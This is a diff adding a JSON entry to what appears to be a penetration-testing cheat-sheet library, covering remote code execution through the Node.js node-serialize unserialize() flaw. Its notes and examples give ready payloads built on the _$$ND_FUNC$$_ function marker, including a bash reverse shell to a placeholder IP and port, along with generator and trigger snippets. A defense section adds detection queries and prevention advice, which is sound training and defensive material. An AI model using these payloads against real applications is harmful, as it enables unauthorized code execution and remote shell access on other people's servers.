@@ -1,0 +1,108 @@
+{
+  "id": "deser-nodejs",
+  "name": "Node.js node-serialize unserialize() RCE",
+  "command": "node -e \"var s=require('node-serialize');console.log(s.serialize({rce:function(){require('child_process').exec('<command>')}()}))\"",
+  "description": "The node-serialize package's unserialize() will evaluate a function embedded in the serialized data when it is tagged with the _$$ND_FUNC$$_ marker and wrapped as an Immediately Invoked Function Expression (IIFE), giving remote code execution the moment unserialize() runs on attacker input. The same flaw affects funcster and serialize-to-js and any serializer that restores JavaScript functions.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Web Exploitation",
+  "subcategory": "Deserialization",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "node-serialize; OpsecX",
+  "tags": [
+    "deserialization",
+    "nodejs",
+    "node-serialize",
+    "unserialize",
+    "funcster",
+    "iife",
+    "rce"
+  ],
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== IDENTIFY A NODE SERIALIZE SINK ===\n  # App calls require('node-serialize').unserialize(req.cookies/body) or similar.\n  # Payloads carry the marker _$$ND_FUNC$$_ followed by a function body.\n\n=== BUILD THE PAYLOAD ===\n  # A serialized function is tagged: \"_$$ND_FUNC$$_function(){...}\".\n  # Appending () after the function body turns it into an IIFE that runs on unserialize().\n  {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()\"}\n\n=== REVERSE SHELL PAYLOAD ===\n  {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/<ip>/<port> 0>&1\\\"');}()\"}\n  # Deliver as a cookie/body value where unserialize() reads it.\n\n=== GENERATE WITH node-serialize ITSELF ===\n  var serialize = require('node-serialize');\n  var o = {rce: function(){ require('child_process').exec('id'); }};\n  var payload = serialize.serialize(o);\n  // then edit the serialized string to append () after the function so it self-invokes.\n\n=== TRIGGER ===\n  var serialize = require('node-serialize');\n  serialize.unserialize(attacker_json);   // IIFE fires -> command runs\n\n=== VARIANTS ===\n  funcster.deepDeserialize(data)      # evaluates module-wrapped functions\n  serialize-to-js deserialize()       # function restoration\n  cryo / older custom serializers\n\n=== ALTERNATIVES ===\n  Python pickle - see deser-python-pickle\n  PHP phpggc - see deser-php-phpggc",
+  "examples": [
+    {
+      "label": "node-serialize IIFE RCE cookie value",
+      "command": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\"}"
+    },
+    {
+      "label": "Reverse shell IIFE payload",
+      "command": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/<ip>/<port> 0>&1\\\"');}()\"}"
+    },
+    {
+      "label": "Serialize an object to get the function format",
+      "command": "node -e \"var s=require('node-serialize');console.log(s.serialize({rce:function(){}}))\""
+    }
+  ],
+  "references": [
+    {
+      "title": "node-serialize (npm)",
+      "url": "https://www.npmjs.com/package/node-serialize"
+    },
+    {
+      "title": "OpsecX - Exploiting Node.js deserialization for RCE",
+      "url": "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"
+    },
+    {
+      "title": "OWASP Deserialization Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "exploit-deserialization",
+      "note": "Generic multi-language deserialization hub card.",
+      "rel": "prereq"
+    },
+    {
+      "id": "deser-php-phpggc",
+      "note": "PHP object-injection chains, a sibling runtime.",
+      "rel": "alternative"
+    },
+    {
+      "id": "deser-python-pickle",
+      "note": "Python pickle RCE, a sibling runtime.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "node-serialize restores JavaScript functions from its serialized form; the _$$ND_FUNC$$_ marker tells it to eval the function body, and an appended () makes that function self-invoke during unserialize(). Restoring executable code from untrusted input is the bug.",
+    "prerequisites": "An endpoint passing attacker-controlled data to node-serialize unserialize() (or funcster/serialize-to-js equivalents).",
+    "impact": "Remote code execution as the Node.js process user.",
+    "detection": "[MITRE T1190] Requests/cookies containing the literal _$$ND_FUNC$$_ marker or child_process references; [MITRE T1059] the node process spawning sh/bash/cmd children.",
+    "artifacts": "Web/proxy logs and cookie values with _$$ND_FUNC$$_ or child_process.exec strings; EDR/auditd process tree node -> sh/bash; outbound connections from the app host.",
+    "splunk_spl": "index=web (request_body=\"*_$$ND_FUNC$$_*\" OR http_cookie=\"*_$$ND_FUNC$$_*\" OR request_body=\"*child_process*\")\n| table _time, src_ip, uri_path, request_body",
+    "elastic_kql": "http.request.body.content:(*ND_FUNC* or *child_process*) or http.request.headers.cookie:*ND_FUNC*",
+    "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"node\",\"node.exe\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"powershell.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+    "sigma_rules": "web_nodejs_node_serialize_nd_func_payload",
+    "prevention": "Do not use node-serialize/funcster on untrusted input; use JSON.parse (which never restores functions). Validate and schema-check all input; keep dependencies audited (npm audit); run the Node process least-privileged and segmented.",
+    "sources": [
+      "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Node.js process spawning a shell (node-serialize RCE)",
+        "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"node\",\"node.exe\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"powershell.exe\",\"curl\",\"wget\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "data_source": "edr",
+        "attack": [
+          "T1059"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Node tooling or build steps that spawn shells",
+        "tuning": "Scope to production app tiers; allowlist known CI/deploy hosts"
+      }
+    ]
+  }
+}
